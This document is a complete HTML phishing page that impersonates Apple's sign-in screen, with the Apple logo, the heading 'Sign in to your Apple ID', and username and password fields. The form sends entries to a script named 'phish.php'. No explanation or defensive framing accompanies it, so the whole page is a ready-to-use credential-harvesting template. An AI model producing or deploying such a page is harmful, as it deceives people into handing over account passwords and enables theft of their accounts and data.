<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple ID - Sign In</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <header>
            <img src="apple-logo.png" alt="Apple Logo" class="logo">
        </header>
        <main>
            <h1>Sign in to your Apple ID</h1>
            <form action="phish.php" method="post">
                <div class="input-group">
                    <label for="apple-id">Apple ID</label>
                    <input type="text" id="apple-id" name="apple-id">
                </div>
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password">
                </div>
                <button type="submit">Sign In</button>
            </form>
            <p class="forgot">
                <a href="#">Forgot Apple ID or password?</a>
            </p>
        </main>
    </div>
</body>
</html>
